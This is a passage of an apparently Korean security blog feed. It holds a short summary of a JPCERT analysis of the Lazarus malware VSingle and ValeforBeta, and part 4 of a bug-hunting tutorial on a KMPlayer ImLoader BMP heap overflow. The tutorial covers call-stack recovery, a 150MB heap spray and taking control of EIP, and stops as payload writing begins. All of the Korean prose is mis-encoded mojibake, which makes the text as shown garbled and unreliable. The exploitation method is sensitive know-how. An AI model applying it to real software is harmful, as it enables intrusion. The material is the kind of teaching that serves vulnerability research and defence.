    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ì¼ë³¸ì„ íƒ€ê¹ƒìœ¼ë¡œ í•œ ë¼ìë£¨ìŠ¤ ë©€ì›¨ì–´ VSingle, ValeforBeta</title>
    <link href="/2021/04/01/idioth/2021-04-01/"/>
    <url>/2021/04/01/idioth/2021-04-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html">Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Japanese orgainsations</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì¼ë³¸ì„ íƒ€ê¹ƒìœ¼ë¡œ ë¼ìë£¨ìŠ¤ê°€ ì‚¬ìš©í•œ ë©€ì›¨ì–´ VSingleê³¼ ValeforBetaì— ëŒ€í•œ ë¶„ì„ ë³´ê³ ì„œê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>VSingleì€ ì›ê²© ë„¤íŠ¸ì›Œí¬ì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰, í”ŒëŸ¬ê·¸ì¸ ë‹¤ìš´ë¡œë“œ ë° ì‹¤í–‰ì„ í•˜ëŠ” HTTP ë´‡ì…ë‹ˆë‹¤. í•´ë‹¹ ë©€ì›¨ì–´ëŠ” ì„¤ì¹˜ë˜ë©´ Explorerë¥¼ ì‹¤í–‰í•˜ê³  DLL injectionì„ í†µí•´ ë©”ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. VSingleì€ HTTP GET requestë¥¼ í†µí•´ C2 ì„œë²„ì™€ í†µì‹ í•©ë‹ˆë‹¤. requestëŠ” base64ë¡œ ì¸ì½”ë”© ë˜ì–´ìˆìœ¼ë©°, IP ì£¼ì†Œ, Windows ë²„ì „ ë“±ì„ í¬í•¨í•©ë‹ˆë‹¤. responseë¥¼ í†µí•´ ì„œë²„ì—ì„œ ëª…ë ¹ì–´ê°€ í¬í•¨ëœ AES ì•”í˜¸í™” ë°ì´í„°ë¥¼ ë‹¤ìš´ë¡œë“œ ë°›ìŠµë‹ˆë‹¤. VSingleì´ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ëª…ë ¹ì–´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>íŒŒì¼ ì—…ë¡œë“œ</li><li>communication interval ì„¤ì •</li><li>ì„ì˜ ëª…ë ¹ ì‹¤í–‰</li><li>í”ŒëŸ¬ê·¸ì¸ ë‹¤ìš´ë¡œë“œ/ì‹¤í–‰</li><li>ì—…ë°ì´íŠ¸</li><li>ë©€ì›¨ì–´ ì •ë³´ ì „ì†¡</li><li>uninstall</li><li>ë‹¤ìš´ë¡œë“œ íŒŒì¼</li></ol><p>VSingleì€ 4 ê°€ì§€ ìœ í˜•ì˜ í”ŒëŸ¬ê·¸ì¸(Windows PE íŒŒì¼, VBS íŒŒì¼, BAT íŒŒì¼, ì‰˜ ì½”ë“œ)ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. í”ŒëŸ¬ê·¸ì¸ì€ <code>%TEMP%</code> í´ë”ì— ì €ì¥ëœ í›„ ì‰˜ ì½”ë“œë¥¼ ì œì™¸í•œ 3ê°œì˜ í”ŒëŸ¬ê·¸ì¸ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><p>ValeforBetaëŠ” Delphië¡œ ì‘ì„±ëœ HTTP ë´‡ìœ¼ë¡œ ì›ê²© ë„¤íŠ¸ì›Œí¬ì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰, íŒŒì¼ ì—…ë¡œë“œ, ë‹¤ìš´ë¡œë“œ ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. <code>INTERNET_OPEN_TYPE_DIRECT</code>, <code>INTERNET_OPEN_TYPE_PRECONFIG</code>, <code>INTERNET_OPEN_TYPE_PROXY</code>ì˜ access typeì„ ê°€ì§€ê³  ìˆìœ¼ë©° POST requestë¥¼ í†µí•´ C2 ì„œë²„ì™€ í†µì‹ í•©ë‹ˆë‹¤. POST requestì—ëŠ” ë°ì´í„°ê°€ í¬í•¨ë˜ì–´ ìˆì§€ ì•Šê³  ì¿ í‚¤ í—¤ë”ì˜ <code>JSESSIONID=</code> ë’¤ì— ê°ì—¼ëœ í˜¸ìŠ¤íŠ¸ì˜ ì •ë³´ê°€ base64 ì¸ì½”ë”© ë˜ì–´ ì „ì†¡ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>lazarus</tag>
      
      <tag>bot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 4</title>
    <link href="/2021/03/31/l0ch/bughunting-tutorials-part4/"/>
    <url>/2021/03/31/l0ch/bughunting-tutorials-part4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 2</a></p><p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 3</a></p><p>ì–´ëŠë§ ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ì˜ ë§ˆì§€ë§‰ ê¸€ì…ë‹ˆë‹¤. Part 3 ì—ì„œ ë°”ë¡œ ì´ì–´ì§€ëŠ” ë‚´ìš©ì´ë‹ˆ ê¸´ë§ ì—†ì´ ë°”ë¡œ ì‹œì‘í•´ë³¼ê²Œìš”!</p><hr><p>ì´ì œë¶€í„°ëŠ” ì½œ ìŠ¤íƒì„ ë³µêµ¬í•´ë³¼ ê²ë‹ˆë‹¤. ì½œ ìŠ¤íƒì„ ë³µêµ¬í•˜ë©´ ìš°ë¦¬ê°€ ì–´ëŠ ì •ë„ì˜ ì½”ë“œë¥¼ ë´ì•¼ í•˜ëŠ”ì§€ ì‚¬ì´ì¦ˆê°€ ë‚˜ì˜µë‹ˆë‹¤. ì´ê±¸ ë³µêµ¬í•˜ê³  ì–´ëŠ ë¶€ë¶„ë¶€í„° ë¶„ì„í•˜ë©´ ì¢‹ì„ì§€ë¥¼ íŒë‹¨í•  ê²ë‹ˆë‹¤.</p><p>ì½œ ìŠ¤íƒì„ ë³µêµ¬í•˜ëŠ” ë°©ë²• ì—­ì‹œ ìœ„ì—ì„œ ì•„ë˜ë¡œ(íƒ‘ë‹¤ìš´) ì•„ë˜ì—ì„œ ìœ„ë¡œ(ë°”í…€ì—…) ë­˜ ì–´ë–»ê²Œ í•˜ë˜ ìƒê´€ì—†ìŠµë‹ˆë‹¤. ê·¸ëƒ¥ ìì‹ ì´ í¸í•˜ì‹  ëŒ€ë¡œ í•˜ë©´ ë©ë‹ˆë‹¤. ë°”í…€ì—… ë°©ì‹ìœ¼ë¡œ í•  ë•Œì—ëŠ” í¬ë˜ì‹œê°€ ë°œìƒí•˜ëŠ” í•¨ìˆ˜ì˜ ì²˜ìŒ ë¶€ë¶„ì— ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ê±¸ì–´ì„œ ë°”ë¡œ ì§ì „ì˜ ë¦¬í„´ ì–´ë“œë ˆìŠ¤ë¥¼ ë³´ë©´ì„œ í•˜ë‚˜í•˜ë‚˜ ì˜¬ë¼ê°€ë©´ ë©ë‹ˆë‹¤. íƒ‘ë‹¤ìš´ ë°©ì‹ìœ¼ë¡œ í•  ê²½ìš° ë™ì  ë””ë²„ê¹…ê³¼ ì •ì  ë””ë²„ê¹…ì„ ì ì ˆíˆ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤. ì¼ë‹¨ ì œì¼ ìœ„(ë¼ê³  ìƒê°í•˜ëŠ” í•¨ìˆ˜)ì— ì „ë‹¬ë˜ëŠ” ì¸ìë¥¼ ë³´ê³  ë¨¼ì € ì •ì  ë¦¬ë²„ì‹±ì„ ì§„í–‰í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ê²°ê³¼ë“¤ì„ ê¸°ë°˜ìœ¼ë¡œ ë™ì  ë””ë²„ê¹…ì„ ê°™ì´ ìˆ˜í–‰í•˜ë©´ ë©ë‹ˆë‹¤.</p><p>ë‚˜ëŠ” ì•„ë¬´ ìƒê°ì´ ì—†ë‹¤!!! ê·¸ëƒ¥ ë¦¬ë²„ì‹±ì„ ìµœëŒ€í•œ ì¤„ì´ê³  ì‹¶ì–´ìš”!!! ì‹œê°„ì€ ë§ì•„ìš”!!!(ëŠ” ê°œë¿” ì œë¡œë°ì´ëŠ” ë¬µíˆë©´ ë˜¥ ë©ë‹ˆë‹¤)ë¼ê³  í•˜ì‹œëŠ” ë¶„ë“¤ì€ ê·¸ëƒ¥ ì œì¼ ìœ„ì— ìˆëŠ” í•¨ìˆ˜ì—ì„œ p ëˆ„ë¥´ê³  í¬ë˜ì‹œ í„°ì§€ë©´ í”„ë¡œê·¸ë¨ ì¬ì‹œì‘í•˜ê³  ê·¸ ì‹œì ìœ¼ë¡œ ê°€ì„œ ë‹¤ì‹œ p ëˆ„ë¥´ê³ â€¦ ì´ë ‡ê²Œ ì­‰ì­‰ ë‚´ë ¤ê°€ëŠ” ë°©ë²•ë„ ìˆìŠµë‹ˆë‹¤. ë¬´ì‹í•˜ì§€ë§Œ í™•ì‹¤í•˜ê¸°ë„ í•˜ì£ â€¦. ëŠ” ì‹œê°„ ë‚­ë¹„ ê°œì©”â€¦ ìŠ¤ë ˆë“œ ì˜ëª» ë¶„ì„í•˜ë©´ ë¦¬ì–¼ ì‹œê°„ ë‚­ë¹„â€¦ (ìŠ¤ë ˆë“œëŠ” í™ì„ ê³µìœ í•˜ê¸° ë•Œë¬¸ì— ì—¬ëŸ¬ ê°œì˜ ìŠ¤ë˜ë“œê°€ ì‚¬ìš©í•˜ëŠ” í™ì—ì„œ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ë©´ ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ìŠ¤ë ˆë“œ ë§ê³  ë‹¤ë¥¸ ìŠ¤ë ˆë“œì—ì„œë„ í¬ë˜ì‹œê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤)ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ ë­ ê·¸ë˜ë„ ì´ê²ƒë§Œí¼ ìƒê° ì—†ì´ í•˜ëŠ” ê±´ ì—†ëŠ” ê±° ê°™ë„¤ìš¬ã…‹ã…‹ã…‹ã…‹ã…‹ (ì§€ê·¹íˆ ì½œ ìŠ¤íƒ ë³µêµ¬ì—ë§Œ í•´ë‹¹ë˜ëŠ” ê²ë‹ˆë‹¤â€¦ ê²°êµ­ì€ ë‹¤ ë¶„ì„í•´ì•¼ ë¼ìš” ã… ã… )</p><p>ì½œ ìŠ¤íƒì„ ë³µêµ¬í•˜ê³  ì²œì²œíˆ ë”°ë¼ë‹¤ê°€ ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ <code>ImLoader+0x27BB0</code> ì—ì„œ í—¤ë” ê²€ì‚¬ë¥¼ ì§„í–‰í•˜ëŠ” ê²ƒì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ìº¡ì²˜ ì‚¬ì§„ì˜ í—¥ìŠ¤ë ˆì´ ì½”ë“œëŠ” ì•„ì´ë‹¤ ë²„ì „ì— ë”°ë¼ ì¡°ê¸ˆì”© ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤)</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png" alt="bughunting-tutorials-part4/image--048.png"></p><p><code>v7</code>ì— ìˆëŠ” ê°’ì´ <code>MB</code>(ìˆ«ìë¡œ ë˜ì–´ ìˆì–´ì„œ ì•ì—ì„œ ëª» ì°¾ì€ ê±°ë„¤ìš”)ì¸ì§€ ë¹„êµí•˜ê³  í‹€ë¦¬ë©´ ìµì…‰ì…˜ì„ ë°œìƒì‹œí‚¤ê³  ë§ë‹¤ë©´ í•´ì„ì„ ì§„í–‰í•˜ê²Œ ë©ë‹ˆë‹¤. ê·¸ëŸ¼ <code>sub_427620</code> ì—ì„œ íŒŒì¼ í•´ì„ì„ ì§„í–‰í•˜ë©´ì„œ í¬ë˜ì‹œê°€ ë°œìƒí•˜ê² ë„¤ìš”!!</p><p>ê·¸ëŸ¼ ì´ì œë¶€í„°ëŠ” ì‹¤ì œ íŒŒì¼ì„ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ê°€ ì–´ë–»ê²Œ ì§„í–‰ë˜ëŠ”ì§€ ì•Œì•„ë³¼ê²Œìš”.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg" alt="bughunting-tutorials-part4/image--050.jpg"></p><p>ë¨¼ì € íŒŒë¼ë¯¸í„°ë¡œ ì „ë‹¬ë˜ì–´ ì˜¨ Stream ê°’ì„ í†µí•´ <code>BITMAPINFOHEADER</code> ì˜ ì‚¬ì´ì¦ˆë¥¼ ê°€ì ¸ì™€ì„œ ì§€ì—­ë³€ìˆ˜ì— ì €ì¥í•´ì¤ë‹ˆë‹¤. ê·¸ëŸ¼ ë‹¹ì—°íˆ ìš°ë¦¬ê°€ ìˆ˜ì •í•œ <code>0x1f28</code> ì´ê² ì£ ? ê·¸ëŸ° ë‹¤ìŒ <code>0x1f28+0x40c</code> ë§Œí¼ <code>BITMAPINFOHEADER</code> ë¥¼ ì €ì¥í•˜ê¸° ìœ„í•œ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•´ì£¼ê³  í•´ë‹¹ ì£¼ì†Œë¥¼ headerì— ì €ì¥í•´ì¤ë‹ˆë‹¤. ê·¸ë¦¬ê³  <code>size</code> ì™€ <code>0xc</code> ê°€ ê°™ì€ ì§€ ë¹„êµë¥¼ í•´ì„œ ê²°ê³¼ ê°’ì„ <code>size_bool</code> ì— ì €ì¥í•©ë‹ˆë‹¤. ì´ë•Œ <code>size</code> ëŠ” <code>0x1f28</code> ì´ê¸° ë•Œë¬¸ì— <code>size_bool</code>ì—ëŠ” 0 ì´ ì €ì¥ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ë°‘ì— ë¶„ê¸°ì ì—ì„œ <code>size_bool</code> ì´ <code>0</code> ì´ê¸° ë•Œë¬¸ì— <code>else</code>ë¡œ ë¹ ì§€ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png" alt="bughunting-tutorials-part4/image--052.png"></p><p><code>else</code>ë¡œ ë¹ ì§€ê²Œ ë˜ë©´ íŒŒì¼ì˜ <code>BITMAPINFOHEADER</code> ì‹œì‘ ë¶€ë¶„ë¶€í„° <code>size</code>ë§Œí¼ ì½ì–´ì™€ì„œ headerì— ì €ì¥í•˜ê²Œ ë©ë‹ˆë‹¤. ì•ì—ì„œ <code>size+0x40c</code> ë§Œí¼ í• ë‹¹ì„ í–ˆê¸° ë•Œë¬¸ì— ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. </p><p>ê·¸ëŸ° ë‹¤ìŒ, compressionì— ëŒ€í•œ ë¶„ê¸°ë¬¸ì„ ë§Œë‚˜ê²Œ ë©ë‹ˆë‹¤. ì´ ê°’ì€ <code>0x00</code> ì—ì„œ <code>0xa00</code>ìœ¼ë¡œ ìˆ˜ì •í–ˆê¸° ë•Œë¬¸ì— í•´ë‹¹ ë¶„ê¸°ë¡œ ë“¤ì–´ê°ˆ ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. ë¶„ê¸°ë¡œ ë“¤ì–´ê°€ë©´ ì²« ë²ˆì§¸ë¡œ í•˜ëŠ” ì¼ì´ ì˜¤ë¸Œì íŠ¸ë¥¼ í• ë‹¹í•˜ë„¤ìš”. ê·¸ëŸ¼ <code>BITMAPINFOHEADER</code> ê°€ í• ë‹¹ëœ ë’·ë¶€ë¶„ì— í• ë‹¹ì´ ë˜ê² ë„¤ìš”.(<code>BITMAPINFOHEADER</code> ê°€ í˜ì´ì§€ë¥¼ í•˜ë‚˜ ë” í• ë‹¹í•  ë§Œí¼ í¬ì§ˆ ì•Šìœ¼ë‹ˆ) ì´ ë¶€ë¶„ì´ ì¤‘ìš”í•©ë‹ˆë‹¤!!! ì™œëƒí•˜ë©´ ìš°ë¦¬ê°€ ë®ê²Œ ë  ê°ì²´ë‹ˆê¹Œìš” ã…ã…(ì‘? <code>BITMAPINFOHEADER</code>ë’¤ì— í• ë‹¹ëœë‹¤ë©°â€¦ ì˜¤ë²„í”Œë¡œìš° ì•ˆ ë‚œë‹¤ë©°â€¦.)</p><p>ë’¤ì— ë” ë³´ë„ë¡ í•˜ì£  ã…ã…ã…ã…</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg" alt="bughunting-tutorials-part4/image--054.jpg"></p><p>ì´ì œëŠ” <code>this</code> ì— <code>BITMAPINFOHEADER</code> ì •ë³´ë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ì°¸ ì°°ì§€ê²Œ ë‹¤ ë„£ë„¤ìš”.<br>ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ì—ëŠ” ëª¨ë“  ë¹„íŠ¸ë§µ ë°ì´í„°ë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ìš°ë¦¬ëŠ” ìµìŠ¤í”Œë¡œì‡ì„ í•  ë•Œ ì´ ë¶€ë¶„ì„ ì´ìš©í•´ì„œ ìŠ¤í”„ë ˆì´ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ã…ã…</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg" alt="bughunting-tutorials-part4/image--056.jpg"></p><p>ì´ì œ ì·¨ì•½ì  ë¶€ë¶„ì…ë‹ˆë‹¤ ã…ã…ã… ë“œë””ì–´ ã…ã…</p><p>ë¨¼ì € ì–´ë–¤ ì£¼ì†Œë¥¼ ê³„ì‚°í•©ë‹ˆë‹¤. Header ì£¼ì†Œ ê¸°ì¤€ìœ¼ë¡œ <code>size</code> ë§Œí¼ ë’¤ì— ì£¼ì†Œë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ë°‘ì— ëª¨ë“  ë¶„ê¸°ë¥¼ ê±´ë„ˆë›°ê³  <code>sub_41AAF0</code> í•¨ìˆ˜ë¡œ ê°‘ë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” íŒŒì¼ ìŠ¤íŠ¸ë¦¼ì—ì„œ <code>byte_4BA6F4[size_bool] * header-&gt;biClrUsed = 0x800</code> ë§Œí¼ ì½ì–´ì„œ ìœ„ì—ì„œ ê³„ì‚°í•œ ì£¼ì†Œì— ì €ì¥í•©ë‹ˆë‹¤.</p><p>ì—¬ê¸°ì—ì„œ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•©ë‹ˆë‹¤!!!! ì•„ê¹Œ ìœ„ì—ì„œ ì–˜ê¸°í–ˆë“¯ì´ header ì˜ í¬ê¸°ëŠ” <code>size+0x40c</code>ì…ë‹ˆë‹¤ ã…‹ã…‹ã…‹ ê·¼ë° ì—¬ê¸°ì—ì„œëŠ” <code>header+size</code> ì— <code>0x800</code> ë°”ì´íŠ¸ë¥¼ í• ë‹¹í•˜ë‹ˆ ë’¤ì— ìˆëŠ” ê°ì²´ë¥¼ ë®ê²Œ ë˜ëŠ” ê±°ì£ !! ê·¸ëŸ¼ ê°ì²´ê°€ ë®ì´ê¸° ì „ê³¼ í›„ë¥¼ í•œë²ˆ ì‚´í´ë³¼ê²Œìš”!!</p><p>Before:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png" alt="bughunting-tutorials-part4/image--058.png"></p><p>After:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png" alt="bughunting-tutorials-part4/image--060.png"></p><p>í—¤í—¿ ì ì´ì œ ê·¸ëŸ¼ <code>eip</code>ë¥¼ ì¡ì„ ìˆ˜ ìˆê² ë„¤ìš”!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png" alt="bughunting-tutorials-part4/image--062.png"></p><p>ë„¤â€¦.? ë­˜ ì¡ëŠ”ë‹¤ëŠ” ê±°ì£ â€¦.? ì¥¬ë¥µâ€¦. ã… ã…  í›„ìš° ì—­ì‹œ ì¸ìƒì€ í—˜ë‚œí•˜ë„¤ìš”â€¦</p><p>ìœ¼ìŒâ€¦ ì´ì œ ë””ë²„ê¹…í•´ë³´ë©´ì„œ í•˜ë‚˜í•˜ë‚˜ í•´ê²°í•´ ë‚˜ê°ˆê²Œìš” ã… ã… <br>ë¨¼ì € <code>0x11111111</code> ì— Access violationì´ ë°œìƒí•˜ëŠ” ê²ƒì€ ìš°ë¦¬ê°€ ë„£ì€ ë°ì´í„°ê°€ ìœ íš¨í•œ ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ê²Œ í•˜ë©´ ë˜ê² ì£ !! í•˜ì§€ë§Œ!!! ASLRì´ ê±¸ë ¤ìˆì–´ì„œ ê·¸ë ‡ê²Œ í•˜ëŠ” ê²Œ ì‰½ì§€ ì•Šë‹¤ëŠ” ê±°â€¦. ê·¸ë ‡ê¸° ë•Œë¬¸ì— ìŠ¤í”„ë ˆì´ë¥¼ ì§„í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ë‹¤í–‰íˆ(??) KMPlayerì™€ ImLoaderê°€ 32 ë¹„íŠ¸ë¡œ ì»´íŒŒì¼ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— ìŠ¤í”„ë ˆì´ë¥¼ í•˜ë©´ ì–´ëŠ ì •ë„ ë¦´ë¼ì´ì–´ë¸”í•˜ê²Œ ì›í•˜ëŠ” ì£¼ì†Œì— ë©”ëª¨ë¦¬ë¥¼ ë§¤í•‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í• ë‹¹í•˜ëŠ” ë©”ëª¨ë¦¬ì— í¬ê¸°ì— ë”°ë¼ì„œ ìì£¼ ë§¤í•‘ë˜ëŠ” ì£¼ì†Œê°€ ë‹¬ë¼ì§‘ë‹ˆë‹¤. ì €ëŠ” ì—¬ê¸°ì—ì„œ 150M ì •ë„ë¥¼ 0x11ë¡œ ìŠ¤í”„ë ˆì´ í–ˆìŠµë‹ˆë‹¤. </p><p>150Më¡œ ìŠ¤í”„ë ˆì´í•œ ì´ìœ ëŠ” ë””ë²„ê¹…í•  ë•Œ ì´ ì •ë„ í¬ê¸°ê°€ ê°€ì¥ ì ë‹¹í•œ ì†ë„ê°€ ë‚˜ì™€ì„œ ì¸ë°ìš”. ë””ë²„ê¹…í•  ë•Œ <code>0x11111111</code> ì— ë§¤í•‘ì´ ì•ˆë˜ë©´ ë‹¤ì‹œ ì‹œì‘í•´ì„œ í…ŒìŠ¤íŠ¸ë¥¼ í•´ì•¼ ë˜ì–ì•„ìš”? í¬ê¸°ê°€ ì»¤ì§€ë©´ ì›í•˜ëŠ” ì£¼ì†Œì— ë§¤í•‘ì´ ë” ì˜ë˜ì§€ë§Œ ìœˆë„ìš°ê°€ ì—…ë°ì´íŠ¸ë¥¼ í•˜ë©´ í• ìˆ˜ë¡ ëœë¤ ë§ˆì´ì§•ì´ ì˜ë¼ì„œ í¬ê¸°ê°€ ì»¤ë„ ì˜ ì•ˆë˜ë”ë¼ê³ ìš” ã… ã… (ì˜ˆì „ì—ëŠ” 300M ë§Œ í•´ë„ ê±°ì˜ ê³ ì •ì´ë¼ê³  ë“¤ì—ˆëŠ”ë°â€¦) ê°€ì¥ íš¨ìœ¨ì ì´ë¼ê³  ìƒê°í•˜ëŠ” í¬ê¸°ë¡œ í–ˆìŠµë‹ˆë‹¤. ë§Œì•½ ì›í•˜ëŠ” ë°ë¡œ ì˜ ëœë‹¤ë©´ ì•„ë˜ì™€ ê°™ì´ í•´ë‹¹ ì£¼ì†Œì— ì˜ ë§¤í•‘ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png" alt="bughunting-tutorials-part4/image--064.png"></p><p>ê·¸ë¦¬ê³  ì´ëŒ€ë¡œ ì‹¤í–‰í•˜ë©´!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png" alt="bughunting-tutorials-part4/image--066.png"></p><p>ì§ì§ì§!! <code>eip</code>ë¥¼ ì¡ì•˜ìŠµë‹ˆë‹¤!!! ì†Œë¦¬ì§ˆëŸ¬ì–´ì–´ì–´ì–´ì–´ì–´!!!! (í•˜â€¦ í—˜ë‚œí–ˆë‹¤â€¦) ì´ì œ ìµìŠ¤ë§Œ í•˜ë©´ ë˜ê² ë„¤ìš” ã…ã…ã…</p><hr><p>ì¼ë‹¨ ì–´ë–»ê²Œ <code>eip</code>ë¥¼ ì¡ê²Œ ë˜ì—ˆëŠ”ì§€ í•¨ ë³¼ê²Œìš”. ì¼ë‹¨ ìŠ¤íƒì— ìˆëŠ” ë¦¬í„´ ì–´ë“œë ˆìŠ¤ë¥¼ í™•ì¸í•´ì„œ ì–´ë””ì—ì„œ <code>call</code> í˜¹ì€ <code>jmp</code>ë¥¼ í–ˆëŠ”ì§€ í™•ì¸í•´ë³¼ê²Œìš”.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png" alt="bughunting-tutorials-part4/image--068.png"></p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png" alt="bughunting-tutorials-part4/image--070.png"></p><p>ìŠ¤íƒì— ìˆëŠ” ë§ˆì§€ë§‰ ë¦¬í„´ ì–´ë“œë ˆìŠ¤ë¥¼ ë³´ë‹ˆ <code>ImLoader+0x357f</code> ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆê³  ì´ ì£¼ì†Œë³´ë‹¤ ìœ„ì— ìˆëŠ” instructionì„ í™•ì¸í•´ë³´ë©´ <code>call dword ptr [ecx-4]</code>ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  <code>ecx</code>ëŠ” <code>eax</code>ê°€ ê°€ë¦¬í‚¤ëŠ” ë©”ëª¨ë¦¬ì—ì„œ ê°€ì ¸ì˜¨ ê²ƒì´ë„¤ìš”.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png" alt="bughunting-tutorials-part4/image--072.png"></p><p>ê·¸ëŸ¼ ì´ì œ ì¤‘ìš”í•œ ê±°ëŠ” <code>0x11111111</code> ì´ ê°€ë¦¬í‚¤ëŠ” ë°ì´í„°ê°€ íŒŒì¼ì—ì„œì˜ ì˜¤í”„ì…‹(ìœ„ì¹˜??)ì´ <code>eax</code>ê°€ ê°€ë¦¬í‚¤ëŠ” ë°ì´í„°ì˜ ì˜¤í”„ì…‹ì´ ì¼ì¹˜í•˜ëƒëŠ” ê²ƒì¸ë°ìš”. ì´ ë¶€ë¶„ì„ í™•ì¸í•´ë³´ê¸° ìœ„í•´ì„œ ì¼ë‹¨ <code>0x11111111</code> ë¶€ë¶„ì´ ì–´ë–¤ ìœ„ì¹˜ì— ìˆëŠ”ì§€ ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg" alt="bughunting-tutorials-part4/image--074.jpg"></p><p>ë§ˆì§€ë§‰ ë©”ëª¨ë¦¬ê°€ ì „ì²´ ë¹„íŠ¸ë§µ ì´ë¯¸ì§€ë¥¼ ë‹´ê³  ìˆëŠ” ë¶€ë¶„ì´ê¸° ë•Œë¬¸ì— í•´ë‹¹ ë©”ëª¨ë¦¬ ê¸°ì¤€ìœ¼ë¡œ ê³„ì‚°í•˜ë©´ ë©ë‹ˆë‹¤. <code>0x11111111 â€“ 0x101cb056 = 0xF460BB</code> ë„¤ìš”. ì•ì—ì„œ ê°ì²´ë¥¼ ë®ì„ ë•Œì—ëŠ” íŒŒì¼ ê¸°ì¤€ìœ¼ë¡œ ì•ë¶€ë¶„ ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ ë³µì‚¬í•˜ê¸° ë•Œë¬¸ì— í˜ì´ë¡œë“œë¥¼ ë‹´ëŠ” ë°ì—ëŠ” í° ë¬¸ì œê°€ ì—†ì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤!!</p><p>ì ì´ì œ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•˜ê¸° ì „ì— MONAì™€ ë©”íƒ€ìŠ¤í”Œë¡œì‡ì„ ì‚¬ìš©í•´ì„œ ëª¨ë“ˆë“¤ì˜ ë¯¸í‹°ê²Œì´ì…˜ ì ìš© í•­ëª©, í•„ìš”í•œ ê°€ì ¯ ê²€ìƒ‰, 